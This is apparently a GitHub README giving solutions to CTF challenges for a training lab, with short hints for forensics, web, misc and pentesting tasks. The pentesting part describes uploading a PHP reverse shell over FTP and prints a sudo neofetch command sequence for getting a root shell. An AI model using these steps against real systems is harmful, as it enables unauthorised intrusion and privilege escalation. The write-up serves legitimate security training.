# CTF_material

**CTF challenges prepared for the year 2022/2023** :space_invader:<br/><br/>
 
# Solutions

<img align="right" src="https://user-images.githubusercontent.com/35840617/171266140-a7f88018-c359-4ad1-955d-f96d54bfbdc1.png" width="300">
<br/>


## Pentesting

VirtualBox .ova file of the machine: https://drive.google.com/file/d/1XHEMLLruedvMY8lN_hyr0ykZWspJ9ug0/view?usp=sharing

- **5ud0 m3 (user):**

    Nmap tcp scan shows 3 services on 3 ports:
    ```
    21      FTP     vsftpd 3.0.3
    22      SSH   
    80      HTTP    NGINX 1.18.0 with PHP7.4
    ```
    A shell can be obtained by uploading a PHP reverse shell using ftp (in /var/www/html/contact/) and sending a request to `http://IP/contact/[your_shell].php`
    <br/><br/>


- **5ud0 m3 (root):**

    The user `www-data` which you have a shell access to has sudo access (without password) on `/usr/bin/neofetch` which can be abused to obtain a root shell using the following commands:
    ```
    TF=$(mktemp)
    echo 'exec /bin/sh' >$TF
    sudo /usr/bin/neofetch --config $TF
    ```
    source: https://gtfobins.github.io/gtfobins/neofetch/#sudo
    <br/><br/>


## Misc
- **Git rekt:**

    Quality: 2/5
    
    level: very easy (repeated)

    Use `git log` and `git show` to reveal the redacted password and decrypt the zip file with it<br/><br/>

- **Magic:**

    Quality: 2/5
    
    level: easy (repeated)

    fix the file header `FF D8 FF E0`<br/><br/>
    
- **Brain:**

    Quality: 2/5
    
    level: easy (repeated)

    brainfuck. Could be identified with cipher identifier tools<br/><br/>
    
- **RubberDucky:**

    Quality: 2/5
    
    level: easy
    
    Read the ducky script and decode the base64 python script and read the flag<br/><br/> 

- **Jhin:**

    Quality: 2/5
    
    level: easy
    
    hint: `there is a cat that can defeat this hash`
    
    theme: 
    ```
    Jhin is a character from League of Legends lore. He is a meticulous criminal psychopath who 
    believesmurder is art. Using his gun as his paintbrush, Jhin createss works of artistic 
    brutality See https://universe.leagueoflegends.com/en_GB/story/champion/jhin/ 
    (this link is unrelated to the CTF). He was finally imprisoned by the Ionian forces 
    and they acquired his password protected safe which should contain clues about one of 
    the hardest murder cases in the history of the investigation department!. Ionian engineers 
    somehow managed to extract a hash of the password. Your task is to crack this password! 
    Jhin's long history in Ionia has made it clear that he is obsessed with the number 4 :) 
    and he always wears a mask.
    ```
    
    Crack an md5hash of a 4 characters long password `hashcat -m 0 hash.txt -a 3 ?a?a?a?a`. This is called mask attack<br/><br/>  

## Web
- **Greedy:**
   
   Quality: 2/5
   
   level: easy
   
   theme: 
    ```
    This greedy web admin hates it when people want to GET webpages from him. This time 
    he decided to block all requests (maybe not all!). Try to GIVE him and see what happens.
    ```

   Intercept http request in burpsuite. Replace `GET` verb with `GIVE` which is a custom http verb<br/><br/>

- **Cookie Monster:**
   
   Quality: 2/5
   
   level: easy

   Change cookie value from `Not_delicious` to `delicious` to pass<br/><br/>
    

## Forensics

- **Git desert:**

    Quality: 4/5
    
    level: medium

    Use `git log` to reveal commit history then `git checkout` to recover the deleted `flag.txt` file<br/><br/>


- **Meta:**

    Quality: 1/5
    
    level: very easy

    Exiftool<br/><br/>
   

- **Sun Emojis:**

    Quality: 3.5/5
    
    level: easy to medium
    
     the file is a rubberducky encoded payload and decode it using https://ducktoolkit.com<br/><br/>  
 - **pdfscripting**

    Quality: 2.5/5
    
    level: easy to medium
    
     the pdf includes an injected javascript code which you will compile and it will give you the flag<br/><br/>  
- **Phishme**

    Quality: 3.5/5
    
    level: easy to medium
    
    the email constains a X-Originating-IP header which is used to open a "malicious" website then you are asked to check if its malicious without opening it using a website called virtustotal https://www.virustotal.com/ and the flag will be in the community section<br/><br/> 
